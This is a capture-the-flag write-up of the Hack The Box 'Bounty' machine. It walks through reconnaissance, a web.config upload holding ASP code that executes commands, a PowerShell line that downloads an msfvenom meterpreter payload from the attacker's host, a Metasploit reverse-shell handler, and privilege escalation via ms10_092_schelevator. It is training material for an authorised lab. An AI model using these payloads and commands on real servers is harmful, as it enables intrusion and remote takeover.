---
slug: bounty-writeup/
title: Bounty Writeup
date: 2018-10-29
category: attacks
subtitle: How to resolve HTB Bounty
tags: security, htb, pwn, web
image: https://res.cloudinary.com/fluid-attacks/image/upload/v1620330675/blog/bounty-writeup/cover_plk66f.webp
alt: Hand holding a pirate toy
description: In this article, we present how to exploit a Bounty machine's
  vulnerabilities and how to gain access as
  an Administrator and obtain the root flag.
keywords: HTB, Security, Hack the Box, Web, Writeup, Bounty, Vulnerabilities,
  Hacker, Ethical Hacking, Pentesting
author: Jonathan Armas
writer: johna
name: Jonathan Armas
about1: Systems Engineer, Security+
about2: Be formless, shapeless like water, Bruce Lee
source: https://unsplash.com/photos/NctO2nqkWCY
---

## Scanning Phase

First, we check the IP of the
[Bounty](https://www.hackthebox.eu/home/machines/profile/142) machine
and try a `ping` to see if we have access.

<div class="imgblock">

![ip](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/bounty-ip_gqy6uf.webp)

</div>

**ping.**

``` bash
host$ ping -c2 10.10.10.93
```

<div class="imgblock">

![ping](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330675/blog/bounty-writeup/ping\_trcnb5.webp)

</div>

Then, we scan the ports with `nmap`. In this case, we’re going to use
basic `nmap`.

``` bash
host$ nmap 10.10.10.93
```

And, we see that there is only one port open `port 80`.

<div class="imgblock">

![nmap](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330675/blog/bounty-writeup/nmap_earkie.webp)

</div>

Then, we try to access `port 80` with our browser, and it opens a web
page with an image of Merlin.

<div class="imgblock">

![web-page](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330675/blog/bounty-writeup/web_fdltrp.webp)

</div>

As we see on this page, there is nothing more than an image, so we’re
going to scan the whole web server with `dirbuster` to see if we can
access something useful.

``` bash
host$ dirb http://10.10.10.91
```

<div class="imgblock">

![dirb-scan](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/dirb_ozvyui.webp)

</div>

Here we found a folder where uploaded files are stored. We need the page
of the upload functionality. With `dirbuster`, and some options, we can
set different extensions and obtain what we are looking for. Since this
is a `Windows` machine, we are going to use `asp` and `aspx` extensions.

``` bash
host$ dirb http://10.10.10.91 -X .asp,.aspx
```

<div class="imgblock">

![dirb-scan2](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330672/blog/bounty-writeup/dirb2_kjlopp.webp)

</div>

<div class="imgblock">

![upload-page](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330672/blog/bounty-writeup/upload-page_eu4cfl.webp)

</div>

## Getting user

In the last step we got an upload page, but with no further
instructions. There we can try to upload an image and check the result.

<div class="imgblock">

![upload1](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/upload1_ewlizg.webp)

</div>

But if we try with a webshell in `aspx` or `asp` it returns an error.

<div class="imgblock">

![upload2](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330673/blog/bounty-writeup/upload2_dgzfkc.webp)

</div>

The web server has a filter that possibly checks the extension of the
uploaded file. If you try with double extension it won’t work either.

So what can we do? In `Windows` there are `3` major types of extensions:
`asp`, `aspx`, and `config`. We already tried the `asp` and `aspx`
extensions, what happens if we upload a `web.config` file?

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified"
           requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
```

<div class="imgblock">

![upload11](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/upload1_ewlizg.webp)

</div>

We can see the result is positive. The `web.config` file is used by
`IIS` servers to store settings that come with the installation of the
`API`.

With this, we can start to exploit this machine. There is a
vulnerability on the `web.config` file processing that could allow an
attacker to execute code remotely, by injecting `asp` code in the file
(More information can be found
[here](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)
).

So, in order to have remote code execution (`RCE`), we need to add the
following lines to our `web.config` file:

``` text
  <!--
  <%
  Response.write("-"&"->")
  Response.write("</p><pre>")
  Set wShell1 = CreateObject("WScript.Shell")
  Set cmd1 = wShell1.Exec("cmd.exe /c whoami")
  output1 = cmd1.StdOut.Readall()
  set cmd1 = nothing: Set wShell1 = nothing
  Response.write(output1)
  Response.write("</pre><p><!-"&"-")
  %>
  -->
```

Then, we upload it, and access the file via the web, as before.

<div class="imgblock">

![rce-ok](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/rce-ok_ae3o75.webp)

</div>

**Eureka\!** With this, we can have our user flag, but we want an active
shell that we can use for further enumeration. For this, we can use
`msfvenom`. This is a tool that creates payloads in order to gain access
to a machine. It is installed by default on `Kali`; it also comes with
the installation of `Metasploit`. Then, we upload our file to the server
with our `RCE` and start a web server on our side to download our
exploit.

First, the exploit with msfvenom:

``` bash
host$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip.ip.ip.ip LPORT=port -f exe -o myexploit.exe --smallest
```

This will create a malicious file. When executed on the server it will
give us a reverse shell with our `RCE` file using `meterpreter`. This is
an advanced, dynamically extensible payload that uses in-memory `DLL`
injection stagers, and is extended over the network at runtime.

Then we need to start a web server in our machine. We can do it with
`Python` by running:

``` bash
host$ python -m SimpleHTTPServer 7000
```

To make the server download our file, we can use the next `PowerShell`
command in our `web.config` file replacing the `whoami` one:

``` xml
Set cmd1 = wShell1.Exec("cmd.exe /c powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://ip.ip.ip.ip:7000/myexploit.exe', 'C:\Windows\Temp\myexploit.exe')")
```

Upload it, and then open it on a private tab. Now, we can see that the
server downloaded our file.

<div class="imgblock">

![download](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330672/blog/bounty-writeup/download_cxvzgn.webp)

</div>

Then we need to start our listener. We can use `Metasploit` to do it:

``` bash
host$ msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST ip.ip.ip.ip
msf exploit(multi/handler) > set LPORT port
msf exploit(multi/handler) > run
```

With this, we are ready to initiate our reverse shell. In order to do
it, we need to run our exploit on the server with the same `RCE` method
as before, changing the command to the following:

``` xml
Set cmd1 = wShell1.Exec("cmd.exe /c C:\Windows\Temp\myexploit.exe")
```

Upload it, open the page of the `web.config` file and we have our
reverse shell.

<div class="imgblock">

![reverse-shell](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330671/blog/bounty-writeup/reverse-shell_v0yoxx.webp)

</div>

## Getting root

With `meterpreter` we can start to enumerate the server.

<div class="imgblock">

![sys-info](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/sys-info_wlfn7g.webp)

</div>

And, we see that the server has an `x64 Architecture`. We are going to
repeat the process (`msfvenom`, `upload`, `handler`, `run`) but now with
the payload:

``` text
windows/x64/meterpreter/reverse_tcp
```

Then, when we have another session opened, we are going to run the next
one:

``` bash
meterpreter > run post/multi/recon/local_exploit_suggester
```

<div class="imgblock">

![exploit-suggester](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330674/blog/bounty-writeup/exploit-suggester_cr3q7v.webp)

</div>

Here we got some exploits that we can use to elevate to `Administrator`,
we are going to use the first one with:

``` bash
meterpreter > background
msf exploit(multi/handler) > use exploit/windows/local/ms10_092_schelevator
msf exploit(windows/local/ms10_092_schelevator) > set SESSION sessionnum
msf exploit(windows/local/ms10_092_schelevator) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/ms10_092_schelevator) > set LPORT port
msf exploit(windows/local/ms10_092_schelevator) > set LHOST ip.ip.ip.ip
msf exploit(windows/local/ms10_092_schelevator) > run
```

When it finishes, we will have a new session created and with user `NT
Authority\System`.

<div class="imgblock">

![admin](https://res.cloudinary.com/fluid-attacks/image/upload/v1620330673/blog/bounty-writeup/admin_bqoqsf.webp)

</div>

With this we can read our `root` flag.

On this challenge, we learned there was a vulnerability with the
`web.config` file. We also learned to always check the architecture when
we access a machine as a user, and how to use some of the `meterpreter`
commands.
